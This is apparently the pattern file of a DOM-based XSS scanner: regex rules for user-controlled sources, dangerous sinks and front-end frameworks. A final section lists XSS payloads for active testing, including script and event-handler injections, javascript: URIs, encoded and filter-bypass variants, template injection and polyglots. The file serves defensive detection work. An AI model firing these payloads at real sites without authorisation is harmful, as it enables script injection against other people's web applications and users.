# DOM XSS Pattern Database
# This file contains patterns for detecting DOM-based XSS vulnerabilities
# Add new patterns here to extend detection capabilities

version: "1.0"
last_updated: "2026-02-04"

# Sources: Entry points where user-controlled data can enter the application
sources:
  # URL-based sources
  - name: "location.hash"
    pattern: 'location\.hash'
    description: "URL fragment identifier - commonly used in SPAs"
    severity: "INFO"
    category: "url"

  - name: "location.search"
    pattern: 'location\.search'
    description: "URL query string"
    severity: "INFO"
    category: "url"

  - name: "location.href"
    pattern: 'location\.href'
    description: "Full URL including protocol, host, path, and query"
    severity: "INFO"
    category: "url"

  - name: "location.pathname"
    pattern: 'location\.pathname'
    description: "URL path component"
    severity: "INFO"
    category: "url"

  - name: "document.URL"
    pattern: 'document\.URL'
    description: "Document URL property"
    severity: "INFO"
    category: "url"

  - name: "document.documentURI"
    pattern: 'document\.documentURI'
    description: "Document URI property"
    severity: "INFO"
    category: "url"

  - name: "document.baseURI"
    pattern: 'document\.baseURI'
    description: "Base URI of the document"
    severity: "INFO"
    category: "url"

  - name: "document.referrer"
    pattern: 'document\.referrer'
    description: "Referring page URL"
    severity: "INFO"
    category: "url"

  - name: "document.cookie"
    pattern: 'document\.cookie'
    description: "Document cookies - can be controlled via Set-Cookie"
    severity: "INFO"
    category: "cookie"

  # Window sources
  - name: "window.name"
    pattern: 'window\.name'
    description: "Window name - persistent across navigations"
    severity: "INFO"
    category: "window"

  - name: "window.location"
    pattern: 'window\.location(?!\s*=)'
    description: "Window location object"
    severity: "INFO"
    category: "url"

  # Storage sources
  - name: "localStorage.getItem"
    pattern: 'localStorage\.getItem\s*\('
    description: "Local storage read"
    severity: "INFO"
    category: "storage"

  - name: "sessionStorage.getItem"
    pattern: 'sessionStorage\.getItem\s*\('
    description: "Session storage read"
    severity: "INFO"
    category: "storage"

  - name: "localStorage[]"
    pattern: 'localStorage\s*\['
    description: "Local storage bracket access"
    severity: "INFO"
    category: "storage"

  - name: "sessionStorage[]"
    pattern: 'sessionStorage\s*\['
    description: "Session storage bracket access"
    severity: "INFO"
    category: "storage"

  # URL parsing
  - name: "URLSearchParams"
    pattern: 'URLSearchParams\s*\('
    description: "URL search params parsing"
    severity: "INFO"
    category: "url"

  - name: "new URL()"
    pattern: 'new\s+URL\s*\('
    description: "URL constructor"
    severity: "INFO"
    category: "url"

  - name: "url.searchParams.get"
    pattern: '\.searchParams\.get\s*\('
    description: "Search params getter"
    severity: "INFO"
    category: "url"

  # Message sources
  - name: "postMessage.data"
    pattern: '\.data(?=.*message)'
    description: "postMessage data property"
    severity: "INFO"
    category: "message"

  - name: "event.data"
    pattern: 'event\.data'
    description: "Event data property"
    severity: "INFO"
    category: "message"

  - name: "e.data"
    pattern: '\be\.data\b'
    description: "Event data shorthand"
    severity: "INFO"
    category: "message"

  # Form/input sources
  - name: "input.value"
    pattern: '\.value(?=.*input|.*text)'
    description: "Input element value"
    severity: "INFO"
    category: "form"

  - name: "document.forms"
    pattern: 'document\.forms'
    description: "Document forms collection"
    severity: "INFO"
    category: "form"

  # jQuery sources
  - name: "$.param"
    pattern: '\$\.param\s*\('
    description: "jQuery param serialization"
    severity: "INFO"
    category: "jquery"

  - name: ".val()"
    pattern: '\.val\s*\(\s*\)'
    description: "jQuery value getter"
    severity: "INFO"
    category: "jquery"

  - name: ".data()"
    pattern: '\.data\s*\(\s*[''"]'
    description: "jQuery data attribute getter"
    severity: "INFO"
    category: "jquery"

  - name: ".attr()"
    pattern: '\.attr\s*\(\s*[''"]'
    description: "jQuery attribute getter"
    severity: "INFO"
    category: "jquery"

  # Custom getters (common patterns)
  - name: "getParameter"
    pattern: 'getParameter\s*\('
    description: "Custom parameter getter"
    severity: "INFO"
    category: "custom"

  - name: "getParam"
    pattern: 'getParam\s*\('
    description: "Custom param getter"
    severity: "INFO"
    category: "custom"

  - name: "getQuery"
    pattern: 'getQuery\s*\('
    description: "Custom query getter"
    severity: "INFO"
    category: "custom"

  - name: "getUrlParam"
    pattern: 'getUrlParam\s*\('
    description: "Custom URL param getter"
    severity: "INFO"
    category: "custom"

  - name: "getHashParam"
    pattern: 'getHashParam\s*\('
    description: "Custom hash param getter"
    severity: "INFO"
    category: "custom"

# Sinks: Dangerous functions that can execute code or inject HTML
sinks:
  # HTML injection sinks - CRITICAL/HIGH
  - name: "innerHTML="
    pattern: '\.innerHTML\s*='
    description: "Direct HTML injection"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "html-injection"

  - name: "outerHTML="
    pattern: '\.outerHTML\s*='
    description: "Outer HTML injection"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "html-injection"

  - name: "insertAdjacentHTML"
    pattern: '\.insertAdjacentHTML\s*\('
    description: "Adjacent HTML injection"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "html-injection"

  - name: "document.write"
    pattern: 'document\.write\s*\('
    description: "Document write - can inject arbitrary HTML"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "html-injection"

  - name: "document.writeln"
    pattern: 'document\.writeln\s*\('
    description: "Document writeln"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "html-injection"

  # Script execution sinks - CRITICAL
  - name: "eval"
    pattern: '\beval\s*\('
    description: "JavaScript eval - executes arbitrary code"
    severity: "CRITICAL"
    cwe: "CWE-95"
    category: "code-execution"

  - name: "Function"
    pattern: '\bFunction\s*\('
    description: "Function constructor - code execution"
    severity: "CRITICAL"
    cwe: "CWE-95"
    category: "code-execution"

  - name: "new Function"
    pattern: 'new\s+Function\s*\('
    description: "New Function constructor"
    severity: "CRITICAL"
    cwe: "CWE-95"
    category: "code-execution"

  - name: "setTimeout-string"
    pattern: 'setTimeout\s*\(\s*[''"`]'
    description: "setTimeout with string argument"
    severity: "HIGH"
    cwe: "CWE-95"
    category: "code-execution"

  - name: "setInterval-string"
    pattern: 'setInterval\s*\(\s*[''"`]'
    description: "setInterval with string argument"
    severity: "HIGH"
    cwe: "CWE-95"
    category: "code-execution"

  - name: "execScript"
    pattern: 'execScript\s*\('
    description: "execScript (IE-specific)"
    severity: "CRITICAL"
    cwe: "CWE-95"
    category: "code-execution"

  # jQuery sinks
  - name: "$.html()"
    pattern: '\.html\s*\([^)]+\)'
    description: "jQuery HTML setter"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "jquery"

  - name: "$.append()"
    pattern: '\.append\s*\([^)]+\)'
    description: "jQuery append"
    severity: "MEDIUM"
    cwe: "CWE-79"
    category: "jquery"

  - name: "$.prepend()"
    pattern: '\.prepend\s*\([^)]+\)'
    description: "jQuery prepend"
    severity: "MEDIUM"
    cwe: "CWE-79"
    category: "jquery"

  - name: "$.after()"
    pattern: '\.after\s*\([^)]+\)'
    description: "jQuery after"
    severity: "MEDIUM"
    cwe: "CWE-79"
    category: "jquery"

  - name: "$.before()"
    pattern: '\.before\s*\([^)]+\)'
    description: "jQuery before"
    severity: "MEDIUM"
    cwe: "CWE-79"
    category: "jquery"

  - name: "$.replaceWith()"
    pattern: '\.replaceWith\s*\([^)]+\)'
    description: "jQuery replaceWith"
    severity: "MEDIUM"
    cwe: "CWE-79"
    category: "jquery"

  - name: "$.wrap()"
    pattern: '\.wrap\s*\([^)]+\)'
    description: "jQuery wrap"
    severity: "MEDIUM"
    cwe: "CWE-79"
    category: "jquery"

  - name: "$()-selector-concat"
    pattern: '\$\s*\(\s*[''"`][^)]*\+'
    description: "jQuery selector with string concatenation"
    severity: "MEDIUM"
    cwe: "CWE-79"
    category: "jquery"

  - name: "$()-template-literal"
    pattern: '\$\s*\(\s*`[^`]*\$\{'
    description: "jQuery selector with template literal"
    severity: "MEDIUM"
    cwe: "CWE-79"
    category: "jquery"

  # Navigation sinks
  - name: "location="
    pattern: '\blocation\s*='
    description: "Location assignment - open redirect"
    severity: "MEDIUM"
    cwe: "CWE-601"
    category: "redirect"

  - name: "location.href="
    pattern: 'location\.href\s*='
    description: "Location href assignment"
    severity: "MEDIUM"
    cwe: "CWE-601"
    category: "redirect"

  - name: "location.assign"
    pattern: 'location\.assign\s*\('
    description: "Location assign method"
    severity: "MEDIUM"
    cwe: "CWE-601"
    category: "redirect"

  - name: "location.replace"
    pattern: 'location\.replace\s*\('
    description: "Location replace method"
    severity: "MEDIUM"
    cwe: "CWE-601"
    category: "redirect"

  - name: "window.open"
    pattern: 'window\.open\s*\('
    description: "Window open - can lead to tabnabbing"
    severity: "MEDIUM"
    cwe: "CWE-601"
    category: "redirect"

  # Framework-specific sinks
  - name: "v-html"
    pattern: 'v-html\s*='
    description: "Vue v-html directive"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "framework"

  - name: "dangerouslySetInnerHTML"
    pattern: 'dangerouslySetInnerHTML'
    description: "React dangerouslySetInnerHTML"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "framework"

  - name: "[innerHTML]"
    pattern: '\[innerHTML\]\s*='
    description: "Angular innerHTML binding"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "framework"

  - name: "ng-bind-html"
    pattern: 'ng-bind-html\s*='
    description: "AngularJS ng-bind-html"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "framework"

  - name: "bypassSecurityTrust"
    pattern: 'bypassSecurityTrust'
    description: "Angular security bypass"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "framework"

  - name: "trustAsHtml"
    pattern: 'trustAsHtml\s*\('
    description: "AngularJS trustAsHtml"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "framework"

  # DOM manipulation sinks
  - name: "setAttribute-on*"
    pattern: 'setAttribute\s*\(\s*[''"]on'
    description: "Setting event handler attribute"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "dom"

  - name: "setAttribute-src"
    pattern: 'setAttribute\s*\(\s*[''"]src[''"]'
    description: "Setting src attribute"
    severity: "MEDIUM"
    cwe: "CWE-79"
    category: "dom"

  - name: "setAttribute-href"
    pattern: 'setAttribute\s*\(\s*[''"]href[''"]'
    description: "Setting href attribute"
    severity: "MEDIUM"
    cwe: "CWE-79"
    category: "dom"

  - name: "createElement-script"
    pattern: 'createElement\s*\(\s*[''"]script[''"]'
    description: "Creating script element"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "dom"

  - name: "createContextualFragment"
    pattern: 'createContextualFragment\s*\('
    description: "Creating document fragment from HTML"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "dom"

  - name: "script.src="
    pattern: 'script\.src\s*='
    description: "Setting script src"
    severity: "HIGH"
    cwe: "CWE-79"
    category: "dom"

  # postMessage sink
  - name: "postMessage"
    pattern: '\.postMessage\s*\('
    description: "postMessage - check origin validation"
    severity: "INFO"
    cwe: "CWE-346"
    category: "message"

# Framework detection patterns
frameworks:
  - name: "jQuery"
    pattern: 'jquery|\.fn\.|jQuery|\$\s*\('
    version_pattern: 'jquery[/-]?(\d+\.\d+(?:\.\d+)?)'

  - name: "React"
    pattern: 'React\.|ReactDOM|createElement|useState|useEffect|dangerouslySetInnerHTML'
    version_pattern: 'react[/-]?(\d+\.\d+(?:\.\d+)?)'

  - name: "Vue"
    pattern: 'Vue\.|v-bind|v-model|v-html|v-on:|@click|:class'
    version_pattern: 'vue[/-]?(\d+\.\d+(?:\.\d+)?)'

  - name: "Angular"
    pattern: 'angular\.|ng-|ngIf|ngFor|\[ngClass\]'
    version_pattern: 'angular[/-]?(\d+\.\d+(?:\.\d+)?)'

  - name: "AngularJS"
    pattern: 'angular\.module|ng-app|ng-controller'
    version_pattern: 'angular[/-]?(\d+\.\d+(?:\.\d+)?)'

  - name: "Svelte"
    pattern: '<script.*context="module"|{@html|bind:'
    version_pattern: 'svelte[/-]?(\d+\.\d+(?:\.\d+)?)'

  - name: "Ember"
    pattern: 'Ember\.|Marionette|{{#each|{{#if'
    version_pattern: 'ember[/-]?(\d+\.\d+(?:\.\d+)?)'

  - name: "Backbone"
    pattern: 'Backbone\.|Marionette'
    version_pattern: 'backbone[/-]?(\d+\.\d+(?:\.\d+)?)'

  - name: "Handlebars"
    pattern: 'Handlebars\.|{{#|{{/|{{>'
    version_pattern: 'handlebars[/-]?(\d+\.\d+(?:\.\d+)?)'

  - name: "Lodash"
    pattern: '_\.|lodash'
    version_pattern: 'lodash[/-]?(\d+\.\d+(?:\.\d+)?)'

# XSS Payloads for active testing
payloads:
  basic:
    - '<script>alert(1)</script>'
    - '<img src=x onerror=alert(1)>'
    - '<svg onload=alert(1)>'
    - '<body onload=alert(1)>'
    - '<iframe src="javascript:alert(1)">'
    - '<input onfocus=alert(1) autofocus>'
    - '<marquee onstart=alert(1)>'
    - '<video><source onerror=alert(1)>'
    - '<audio src=x onerror=alert(1)>'
    - '<details open ontoggle=alert(1)>'

  event_handlers:
    - "'-alert(1)-'"
    - '"-alert(1)-"'
    - "';alert(1)//"
    - '";alert(1)//'
    - "onmouseover=alert(1)//"
    - "onfocus=alert(1) autofocus//"

  javascript_protocol:
    - 'javascript:alert(1)'
    - 'javascript:alert(document.domain)'
    - 'javascript:alert(document.cookie)'
    - 'JaVaScRiPt:alert(1)'
    - 'javascript:/**/alert(1)'

  encoded:
    - '%3Cscript%3Ealert(1)%3C/script%3E'
    - '%3Csvg%20onload=alert(1)%3E'
    - '&#60;script&#62;alert(1)&#60;/script&#62;'
    - '\x3cscript\x3ealert(1)\x3c/script\x3e'
    - '\u003cscript\u003ealert(1)\u003c/script\u003e'

  template_injection:
    - '{{constructor.constructor("alert(1)")()}}'
    - '${alert(1)}'
    - '#{alert(1)}'
    - '{{7*7}}'
    - '${7*7}'

  dom_clobbering:
    - '<form id=x><input name=y value=z>'
    - '<img name=x>'
    - '<a id=x href=y>'

  filter_bypass:
    - '<svg/onload=alert(1)>'
    - '<svg onload=alert(1)//>'
    - '<svg onload="alert(1)">'
    - "<svg onload='alert(1)'>"
    - '<img src=x onerror="alert(1)">'
    - '<img src=x onerror=alert`1`>'
    - '<script>alert(String.fromCharCode(88,83,83))</script>'

  polyglot:
    - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//"
    - "'\"-->]]>*/</script></style></title></textarea></noscript></template></select><svg/onload=alert()>"
